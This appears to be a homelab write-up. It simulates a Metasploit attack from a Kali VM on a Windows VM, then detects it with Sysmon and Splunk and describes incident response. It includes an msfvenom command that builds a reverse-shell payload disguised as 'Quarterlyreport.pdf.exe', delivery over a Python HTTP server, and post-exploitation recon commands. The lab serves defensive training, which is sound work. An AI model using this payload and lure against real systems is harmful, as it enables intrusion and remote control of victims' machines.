<h3>Objective</h3>

I created this lab to have a safe space to safely experiment with red/blue team roles in a live environment. In this lab, I will create a private network with two endpoints. One of the VMs will be our blue team machine(Windows Box) and the other will be our red team machine(Kali-linux). I will place both machines on a private network and use Metasploit in the Kali Linux VM to attack our Blue team VM, which will have Sysmon and a Splunk instance to capture all the traffic. 

<h3>Skills Learned</h3>  

-Log analysis

-Configuration of a System Information Event Manager(SIEM)

-Red/blue teaming

-Virtual machine configuration

-Experience in a simulated live environment

<h3>Tools Used</h3>

-Splunk

-Sysmon

-Metasploit


Spin up two VMs, One being Windows and the other being Kali Linux. On both VMs set the network adapter to the "Internal Network" setting while making both VM IPs static to the same network. This network scheme was selected to keep the VMs from being accessible from the open web, while also having the ability to communicate with each other.

The IP's in this Homelab: Windows VM- 192.168.33.2, Kali VM- 192.168.33.3 

For this lab, we will open up the RDP port(3389) and turn off the firewall on our Windows VM.

<img width="583" alt="image" src="https://github.com/user-attachments/assets/5b423ff8-596e-4f76-95a8-854c507c9b36" />

Ref 1: Virtual Box Settings

<h3>Splunk Setup</h3>

To set up our blue team environment on our Windows VM, we will be configuring Sysmon on the endpoint to gather event logs and send them directly to our Splunk instance, also installed on our Windows machine.
We did this by allocating a Sysmon config file from Github, copying it to the directory containing the Sysmon application, and running the command ./sysmon64.exe -i sysmonconfig.xml in Powershell.
Installing Sysmon will enhance our ability to capture system events.(Since I don't want to expose these VMs to the open web, I downloaded the config file from my main PC, enabled bidirectional drag and drop on the VM, and copied the file directly into the VM.) 
For Splunk configuration, I installed the Sysmon add-on and created the "endpoint" index. Our Sysmon config file will point to the index we created by its name, allowing Sysmon to send logs to our Splunk instance

<h3>Weaponization</h3>
  
  To create telemetry from our Kali VM to our Windows VM, we are going to use the well-known Metasploit pentesting tool.
We will start by creating the Malware payload with this command: msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.33.3 -f exe Quarterlyreport.pdf.exe
-p chooses the payload we want to use provided by the Metasploit tool. 
"lhost", determines which IP this reverse shell payload will remote back to when executed.
-f will decide the file name, we will name it Quarterlyreport.pdf.exe to entice the "end user" to click on it.

![Screenshot 2025-03-12 072905](https://github.com/user-attachments/assets/17e8deb8-90ab-4509-b982-a718275314f4)

Ref 2: Malicious Payload

<h3>Delivery/Installation</h3>

Now we need to deliver the payload to the end user.
To do so, we will host an HTTP Python server by running the command found below inside the directory where the payload was saved to
python3 -m http.server 9999. 
On our Windows machine we will search the IP of our Kali box followed by ":9999" which is the port designated in our Python command. 

![executing the file](https://github.com/user-attachments/assets/b5601151-d80e-4cca-9425-6304a0f62d4e)

Ref 3: Delivering the Payload to the Victim

After searching this, it will take us to the directory in our Kali VM. We will then download and execute the malicious file we created.
We see on our Kali terminal that a GET request was logged
After running "netstat -anob" on the Windows VM we see a network connection established to our Kali box 

<h3>Command & Control</h3>

Now that we have successfully delivered and installed our malware, it's time to carry out the exploitation phase of our attack.
We do this by opening the Msfconsole on our Kali VM and configuring the handler by setting the payload to "windows/x64/meterpreter/reverse_tcp" and setting our local IP and the port we want the exploit to use on the victim machine.
After configuring the handler, we insert the exploit into the CLI to initiate the reverse TCP handler.
The session has been opened with our victim machine (192.168.33.2).

![Updated handler](https://github.com/user-attachments/assets/1106b392-a05b-4a9f-a284-8d72a3783490)

Ref 4: Reverse Shell

Now we will run the following commands in our handler to open up a shell and create network traffic to analyze in our Splunk instance.
Commands: shell, netstat, ipconfig, net user, net group.

<h3>Log Analysis</h3>

Time to do some threat hunting in our Splunk instance.
We will start by searching for our index in Splunk.
I have a suspicion that the 192.168.33.3 IP we are sending traffic to is a threat, let's filter traffic that is being sent to that IP.

![Screenshot 2025-03-10 211850](https://github.com/user-attachments/assets/63eb2f00-f37e-44f8-a4ad-3107ed305bd4)

Ref 5: Splunk Query by IP

After analyzing the event, we see that one of the events has a suspicious .exe file with two file extensions in the name
Luckily, we are running Sysmon, which allows the SourceProcessGUID, if we filter by this field, we can display all events related to this suspicious file 

![SIEM SourceProcessGUID](https://github.com/user-attachments/assets/d41747eb-220b-4aaf-a606-6870af1f8ff4)

Ref 6: Splunk Event Details

We queried the SourceProcessGUID and organized the output with the table command to display the Time, ParentImage, Image, and Command Line

![Final SIEM](https://github.com/user-attachments/assets/e96640cd-65a9-40e6-a0a4-0e3663bc74e8)

Ref 7: Shell Commands With a Parent Process of Quarterlyreport.pdf.exe

<h3>Incident Response</h3>

Upon analysis, we see commands being executed affiliated with an IP that is not the host's, sound the alarms.
In a real life scenario, this endpoint would be immediately quarantined from the rest of the network to mitigate damage from spreading.
The IP would also be blacklisted and the firewall reconfigured to block this suspected RAT throughout the network.

